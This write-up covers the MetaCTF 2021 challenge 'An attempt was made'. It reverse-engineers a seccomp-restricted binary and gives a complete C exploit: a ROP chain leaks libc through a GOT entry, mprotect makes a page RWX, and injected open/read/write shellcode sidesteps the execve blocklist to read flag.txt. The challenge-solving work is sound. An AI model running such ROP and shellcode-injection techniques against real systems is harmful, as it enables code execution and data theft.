# An attempt was made ~ Write-Up

'An attempt was made' is a binary exploitation challenge and was part of the MetaCTF 2021 event.

**Points:** 400
**Solves:** 13

## Environment Information

This challenge comes with following files

- ```chall``` the challenge binary
- ```libc.so.6``` dependency for challenge binary
- ```ld.so``` dynamic linker/loader used by the binary
- ```chall.sh```, ```chall.xinetd```, ```init.sh```, ```Dockerfile```

The vulnerable binary has been compiled with following protections: ```NX``` and ```Partial RELRO```.

## Reverse Engineering Summary

When executing the program, it asks for the number of bytes the user wants to enter.

```console
How many bytes?
```

```console
How many bytes?
3
aa
Thanks!
```

Looking at the disassembly reveals five interesting functions

- sym.main
- sym.setup
- sym.seccomp
- sym.vuln
- sym.read_byte

Here is a brief description of these functions:

**sym.main:** this function seems rather simple. It simply calls ```sym.setup``` and ```sym.vuln```   
**sym.setup:** disables double buffering of stdout, stdin, stderr. Calls ```sym.seccomp```  
**sym.seccomp:** configures secure-computing via a berkeley-packet-filter
**sym.vuln:** asks for the total amount of bytes, then calls ```sym.read_byte```
**sym.read_byte:** reads further user input, the total amount depends on function parameter 

After further analysis, these are some more interesting findings

- ```sym.seccomp``` is configuring a syscall blacklist with ```execve```, ```execveat``` and ```rt_sigreturn``` being blocked.

```assembly
66 c7 44 24 30 15 00    mov    WORD PTR [rsp+0x30],0x15
c6 44 24 32 00          mov    BYTE PTR [rsp+0x32],0x0
c6 44 24 33 01          mov    BYTE PTR [rsp+0x33],0x1
c7 44 24 34 3b 00 00    mov    DWORD PTR [rsp+0x34],0x3b    ; execve blocked
00 
66 c7 44 24 38 06 00    mov    WORD PTR [rsp+0x38],0x6
c6 44 24 3a 00          mov    BYTE PTR [rsp+0x3a],0x0
c6 44 24 3b 00          mov    BYTE PTR [rsp+0x3b],0x0
c7 44 24 3c 00 00 00    mov    DWORD PTR [rsp+0x3c],0x0
00 
66 c7 44 24 40 15 00    mov    WORD PTR [rsp+0x40],0x15
c6 44 24 42 00          mov    BYTE PTR [rsp+0x42],0x0
c6 44 24 43 01          mov    BYTE PTR [rsp+0x43],0x1
c7 44 24 44 42 01 00    mov    DWORD PTR [rsp+0x44],0x142   ; execveat blocked
00 
66 c7 44 24 48 06 00    mov    WORD PTR [rsp+0x48],0x6
c6 44 24 4a 00          mov    BYTE PTR [rsp+0x4a],0x0
c6 44 24 4b 00          mov    BYTE PTR [rsp+0x4b],0x0
c7 44 24 4c 00 00 00    mov    DWORD PTR [rsp+0x4c],0x0
00 
66 c7 44 24 50 15 00    mov    WORD PTR [rsp+0x50],0x15
c6 44 24 52 00          mov    BYTE PTR [rsp+0x52],0x0
c6 44 24 53 01          mov    BYTE PTR [rsp+0x53],0x1
c7 44 24 54 0f 00 00    mov    DWORD PTR [rsp+0x54],0xf     ; rt_sigreturn blocked
00 
```  
<sup>berkeley packet filter</sup>

- it is possible to overwrite the return address in ```sym.read_bytes```

## Exploit Strategy

We can use the previously mentioned vulnerability in order to take control over ```RIP```. From
there we need to leak a libc pointer. But it seems like that the challenge designer removed ```libc_csu_*``` functions
(making it hard to control registers like ```rdi```, ```rsi```). Nevertheless I found a way
to bypass this by recycling parts of the loop found in ```sym.read_bytes```.

```assembly
@4013c0
mov rsi, rbx          ; we control rbx, therefore rsi
lea eax, [rbp + rsi]
cmp r12d, eax
jle 0x4013e9          --------+
                              |
[...]                         | r12d <= rbp + rsi
                              |
mov eax, 0            <-------+
add rsp, 0x10
pop rbx
pop rbp
mov r12, qword [rsp]
add rsp, 0x8
ret
```

In order to break the loop and return as early as possible, we need to fulfill further requirements.
We need to choose ```rbp, rbx, r12``` so that ```r12d <= (rbp + rsi) where rsi = rbx```. Probably the easiest solution
to this would be ```rbp = rbx = r12```. Luckily we control all three registers with following gadget

```assembly
@4013f2
pop rbx
pop rbp
mov r12, qword [rsp]
add rsp, 0x8
ret
```

Now it's time to force ```write``` to leak its ```GOT``` entry. Following chain will leak the libc pointer

```assembly
@4013f2
pop rbx
pop rbp
mov r12, qword [rsp]
add rsp, 0x8
ret

< rbx: write_got @ 0x0000000000404028 >
< rbp: write_got @ 0x0000000000404028 >
< r12: write_got @ 0x0000000000404028 >

@4013c0
mov rsi, rbx
lea eax, [rbp + rsi]
cmp r12d, eax
jle 0x4013e9          --------+
                              |
[...]                         | r12d <= rbp + rsi
                              |
mov eax, 0            <-------+
add rsp, 0x10
pop rbx
pop rbp
mov r12, qword [rsp]
add rsp, 0x8
ret

< [rsp+0x00] padding >
< [rsp+0x08] padding >
< rbx: 0x00000000 >
< rbp: 0x00000001 >
< r12: 0x00000000 >

@401441
mov edi, 1
mov edx, 8
call write@plt
add rsp, 0x18
ret

< [rsp+0x00] padding >
< [rsp+0x08] padding >
< [rsp+0x10] padding >

< sym.vuln @ 0x401415 (restart input) >
```

We now have access to libc gadgets, so let's get rid of ```W^X``` by using the ```mprotect```
syscall with ```start = 0x0000000000404000```, ```len = 0x3000``` and ```prot = 0x7 (RWX)```. Right after
setting up a ```RWX page```, we need to make another syscall to ```read``` in order to write our shellcode
to the page

```assembly
@8ff1d
pop rdi
ret

< rdi: 0x0000000000404000 >

@4013f2
pop rbx
pop rbp
mov r12, qword [rsp]
add rsp, 0x8
ret

< rbx: 0x0000000000003000 >
< rbp: 0x0000000000003000 >
< r12: 0x0000000000003000 >

@4013c0
mov rsi, rbx
lea eax, [rbp + rsi]
cmp r12d, eax
jle 0x4013e9          --------+
                              |
[...]                         | r12d <= rbp + rsi
                              |
mov eax, 0            <-------+
add rsp, 0x10
pop rbx
pop rbp
mov r12, qword [rsp]
add rsp, 0x8
ret

< [rsp+0x00] padding >
< [rsp+0x08] padding >
< rbx: 0x004040b0 >
< rbp: 0x004040b0 >
< r12: 0x004040b0 >

@8ef1b
pop rdx
ret

< rdx: 0x07 (R | W | X) >

@626150
mov eax, 0x0a
syscall

@4013c0
mov rsi, rbx
lea eax, [rbp + rsi]
cmp r12d, eax
jle 0x4013e9          --------+
                              |
[...]                         | r12d <= rbp + rsi
                              |
mov eax, 0            <-------+
add rsp, 0x10
pop rbx
pop rbp
mov r12, qword [rsp]
add rsp, 0x8
ret

< [rsp+0x00] padding >
< [rsp+0x08] padding >
< rbx: 0x004040b0 >
< rbp: 0x004040b0 >
< r12: 0x004040b0 >

@8ff1d
pop rdi
ret

< rdi: 0x0 (stdin) >

@8ef1b
pop rdx
ret

< rdx: 0x10000000 >

@61cd00
mov eax, DWORD PTR fs:0x18
test eax, eax
jne 0x61cd20
syscall

< [rsp+0x00] 0x4040b0 (start of shellcode) >
```

Seccomp is still active and is going to block all syscalls to ```execve``` and ```execveat```.
I guess there are two options for this problem

- 1. finding a bug in seccomp configuration (misconfiguration)
- 2. crafting shellcode without those syscalls

Since I could not find any bugs in the configuration, I decided to go with the second option: Crafting
a shellcode to ```open```, ```read``` then ```write``` the file of interest, thus avoiding blocked
syscalls. From the previously solved challenges, we can assume that the flag will be in ```flag.txt``` 

```assembly
jmp short trampoline

sc_open_file:
pop rdi
xor rsi, rsi
mov eax, 0x02
syscall

sc_read_file:
lea rsi, [rdi + 0xb]
mov rdi, rax
xor rax, rax
mov rdx, 0x20
syscall

sc_write_file:
mov rdi, 0x01
mov rax, 0x01
syscall

trampoline:
call sc_open_file

DB BYTE "flag.txt", 0
```

That's it. So in summary there are four steps to take

- Stage 1: leak a pointer to libc by dumping a ```GOT``` entry
- Stage 2: create a ```RWX page``` for the shellcode
- Stage 3: inject shellcode to open, read and write the flag-file
- Stage 4: set instruction pointer to start of shellcode

## Putting it all together

This time I decided to use [cpwntools](https://github.com/nequ4tion/cpwntools) instead of regular pwntools :)

```c
/* Exploit for the 'An attempt was made' Challenge (MetaCTF 2021) */

// libc Headers
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <inttypes.h>
#include <fcntl.h>

// cpwntools Headers
#include <cpwn.h>
#include <cpwn/networking/tcp/tcp.h>

/* --- Definition of Constants --- */

#define REMOTE_IP  "3.83.44.76"
#define REMOTE_PORT 3030

#define WRITE_GOT       0x0000000000404028
#define WRITE_GLIBC     0x000000000061cda0 

#define POP_RBX_RBP_R12 0x00000000004013f2
#define MOV_RSI_RBX     0x00000000004013c0
#define CALL_WRITE      0x0000000000401441
#define REPLAY          0x0000000000401415     

#define POP_RDI         0x000000000008ff1d
#define POP_RDX         0x000000000008ef1b

#define MPROT_SYSCALL   0x0000000000626150
#define READ_SYSCALL    0x000000000061cd00

#define FRAME_OFFSET 32
#define N0           FRAME_OFFSET + 128 + 1
#define N1           FRAME_OFFSET + 224 + 1

#define COLOR_DFL   "\e[39m"
#define COLOR_RED   "\e[31m"
#define COLOR_GREEN "\e[32m"

const uint8_t shellcode[] = {

    "\xeb\x28"                      // jmp short trampoline
    "\x5f"                          // pop rdi
    "\x48\x31\xf6"                  // xor rsi, rsi
    "\xb8\x02\x00\x00\x00"          // mov eax, 0x02
    "\x0f\x05"                      // syscall
    "\x48\x8d\x77\x0b"              // lea rsi, [rdi + 0xb]
    "\x48\x89\xc7"                  // mov rdi, rax
    "\x48\x31\xc0"                  // xor rax, rax               
    "\xba\x20\x00\x00\x00"          // mov rdx, 0x20              
    "\x0f\x05"                      // syscall                    
    "\xbf\x01\x00\x00\x00"          // mov rdi, 0x01              
    "\xb8\x01\x00\x00\x00"          // mov rax, 0x01              
    "\x0f\x05"                      // syscall                    
    "\xe8\xd3\xff\xff\xff"          // call sc_open_file
    "\x66\x6c"                      // "fl"
    "\x61"                          // "a"
    "\x67\x2e\x74\x78"              // "g.tx"
    "\x74\x00"                      // "t\x00"
};

/* --- Enums, Structs, Typedefs */

typedef enum {

    ENDIAN_LE,
    ENDIAN_BE

} ENDIAN;

/* --- Forward Declaration --- */

uint64_t leak_libbase(sock_t *sock);
void mprotect_rwx(sock_t *sock, const uint64_t libbase);
void extract_file(sock_t *sock, char *leak_buffer);

void print_leakage(const char *what, const uint64_t info);
uint64_t bytes_to_u64(uint8_t *bytes, const ENDIAN e);
void u64_to_bytes(const uint64_t num, const ENDIAN e, uint8_t *buffer);

/* --- Functions ---*/

int main(void) {

    char msg[256]; char flag[32];

    sock_t sock = tcp.remote(REMOTE_IP, REMOTE_PORT);
    tcp.recv(&sock, msg, 256);

    printf("[+] leaking memory...\n");

    const uint64_t libbase = leak_libbase(&sock);
    print_leakage("libbase", libbase);

    printf("[+] leakage done. getting rid of W^X...\n");
    mprotect_rwx(&sock, libbase);

    printf("[+] done. extracting file from server...\n");
    extract_file(&sock, flag);

    printf("%s[+] received flag: %s%s", COLOR_GREEN, flag, COLOR_DFL);

    tcp.shutdown(&sock);
    tcp.close(&sock);

    return EXIT_SUCCESS;
}

uint64_t leak_libbase(sock_t *sock) {

    uint8_t chain[N0], pleak[8];
    memset(chain, 0x41, FRAME_OFFSET);

    u64_to_bytes(0xdeadbeef,      ENDIAN_LE, chain + FRAME_OFFSET +   0);
    u64_to_bytes(POP_RBX_RBP_R12, ENDIAN_LE, chain + FRAME_OFFSET +   8);
    u64_to_bytes(WRITE_GOT,       ENDIAN_LE, chain + FRAME_OFFSET +  16);
    u64_to_bytes(WRITE_GOT,       ENDIAN_LE, chain + FRAME_OFFSET +  24);
    u64_to_bytes(WRITE_GOT,       ENDIAN_LE, chain + FRAME_OFFSET +  32);
    u64_to_bytes(MOV_RSI_RBX,     ENDIAN_LE, chain + FRAME_OFFSET +  40);
    u64_to_bytes(0xdeadbeef,      ENDIAN_LE, chain + FRAME_OFFSET +  48);
    u64_to_bytes(0xdeadbeef,      ENDIAN_LE, chain + FRAME_OFFSET +  56);
    u64_to_bytes(0x00000000,      ENDIAN_LE, chain + FRAME_OFFSET +  64);
    u64_to_bytes(0x00000001,      ENDIAN_LE, chain + FRAME_OFFSET +  72);
    u64_to_bytes(0x00000000,      ENDIAN_LE, chain + FRAME_OFFSET +  80);
    u64_to_bytes(CALL_WRITE,      ENDIAN_LE, chain + FRAME_OFFSET +  88);
    u64_to_bytes(0xdeadbeef,      ENDIAN_LE, chain + FRAME_OFFSET +  96);
    u64_to_bytes(0xdeadbeef,      ENDIAN_LE, chain + FRAME_OFFSET + 104);
    u64_to_bytes(0xdeadbeef,      ENDIAN_LE, chain + FRAME_OFFSET + 112);
    u64_to_bytes(REPLAY,          ENDIAN_LE, chain + FRAME_OFFSET + 120);

    chain[ FRAME_OFFSET + 128 ] = 0x0a;

    tcp.send(sock, "161\x0a", 4);
    tcp.send(sock, chain,     N0);
    tcp.recv(sock, pleak,     8);

    return bytes_to_u64(pleak, ENDIAN_LE) - WRITE_GLIBC;
}

void mprotect_rwx(sock_t *sock, const uint64_t libbase) {

    uint8_t chain[N1];
    memset(chain, 0x41, FRAME_OFFSET);

    u64_to_bytes(0xdeadbeef,              ENDIAN_LE, chain + FRAME_OFFSET +   0);
    u64_to_bytes(libbase + POP_RDI,       ENDIAN_LE, chain + FRAME_OFFSET +   8);
    u64_to_bytes(0x00404000,              ENDIAN_LE, chain + FRAME_OFFSET +  16);
    u64_to_bytes(POP_RBX_RBP_R12,         ENDIAN_LE, chain + FRAME_OFFSET +  24);
    u64_to_bytes(0x00003000,              ENDIAN_LE, chain + FRAME_OFFSET +  32);
    u64_to_bytes(0x00003000,              ENDIAN_LE, chain + FRAME_OFFSET +  40);
    u64_to_bytes(0x00003000,              ENDIAN_LE, chain + FRAME_OFFSET +  48);
    u64_to_bytes(MOV_RSI_RBX,             ENDIAN_LE, chain + FRAME_OFFSET +  56);
    u64_to_bytes(0xdeadbeef,              ENDIAN_LE, chain + FRAME_OFFSET +  64);
    u64_to_bytes(0xdeadbeef,              ENDIAN_LE, chain + FRAME_OFFSET +  72);
    u64_to_bytes(0x004040b0,              ENDIAN_LE, chain + FRAME_OFFSET +  80);
    u64_to_bytes(0x004040b0,              ENDIAN_LE, chain + FRAME_OFFSET +  88);
    u64_to_bytes(0x004040b0,              ENDIAN_LE, chain + FRAME_OFFSET +  96);    
    u64_to_bytes(libbase + POP_RDX,       ENDIAN_LE, chain + FRAME_OFFSET + 104);
    u64_to_bytes(0x00000007,              ENDIAN_LE, chain + FRAME_OFFSET + 112);
    u64_to_bytes(libbase + MPROT_SYSCALL, ENDIAN_LE, chain + FRAME_OFFSET + 120);
    u64_to_bytes(MOV_RSI_RBX,             ENDIAN_LE, chain + FRAME_OFFSET + 128);
    u64_to_bytes(0xdeadbeef,              ENDIAN_LE, chain + FRAME_OFFSET + 136);
    u64_to_bytes(0xdeadbeef,              ENDIAN_LE, chain + FRAME_OFFSET + 144);
    u64_to_bytes(0x00000000,              ENDIAN_LE, chain + FRAME_OFFSET + 152);
    u64_to_bytes(0x00000001,              ENDIAN_LE, chain + FRAME_OFFSET + 160);
    u64_to_bytes(0x00000000,              ENDIAN_LE, chain + FRAME_OFFSET + 168);  
    u64_to_bytes(libbase + POP_RDI,       ENDIAN_LE, chain + FRAME_OFFSET + 176);
    u64_to_bytes(0x00000000,              ENDIAN_LE, chain + FRAME_OFFSET + 184);
    u64_to_bytes(libbase + POP_RDX,       ENDIAN_LE, chain + FRAME_OFFSET + 192);
    u64_to_bytes(0x10000000,              ENDIAN_LE, chain + FRAME_OFFSET + 200);
    u64_to_bytes(libbase + READ_SYSCALL,  ENDIAN_LE, chain + FRAME_OFFSET + 208);
    u64_to_bytes(0x004040b0,              ENDIAN_LE, chain + FRAME_OFFSET + 216);

    chain[ FRAME_OFFSET + 224 ] = 0x0a;

    tcp.send(sock, "257\x0a", 4);
    tcp.send(sock, chain,     N1);
}

void extract_file(sock_t *sock, char *leak_buffer) {

    tcp.send(sock, shellcode, sizeof(shellcode));
    tcp.send(sock, "\x0a", 1);
    tcp.recv(sock, leak_buffer, 0x20);
}

void print_leakage(const char *what, const uint64_t info) {

    printf("%s[+] leaked %s: 0x%016"PRIx64"%s\n", COLOR_GREEN, what, info, COLOR_DFL);
}

uint64_t bytes_to_u64(uint8_t *bytes, const ENDIAN ein) {

    uint64_t result = 0x00;

    for(int32_t i = 0; i < 8; i++) {

        const int32_t index = (ein == ENDIAN_BE) ? 7 - i : i;
        result |= ((uint64_t) bytes[ index ] << (i * 8));
    }

    return result; // output: big endian
}

void u64_to_bytes(const uint64_t num, const ENDIAN eout, uint8_t *buffer) {

    // input: big endian

    for(int32_t i = 0; i < 8; i++) {

        const int32_t index = (eout == ENDIAN_BE) ? 7 - i : i;
        buffer[ index ] = (num & ((uint64_t) 0xff << (i * 8))) >> (i * 8);
    }
}
```

![m21aawm](https://user-images.githubusercontent.com/46600932/155649585-87276df2-48a7-495c-9047-a2c76b584191.png)
<sup>Finally executing the exploit</sup>

## Conclusion

Overall the vulnerability was trivial, but the author made register control pretty hard by intentionally removing ```csu``` gadgets.
The real challenge was to control relevant registers (especially ```rsi```) and then, bypass the seccomp filter.

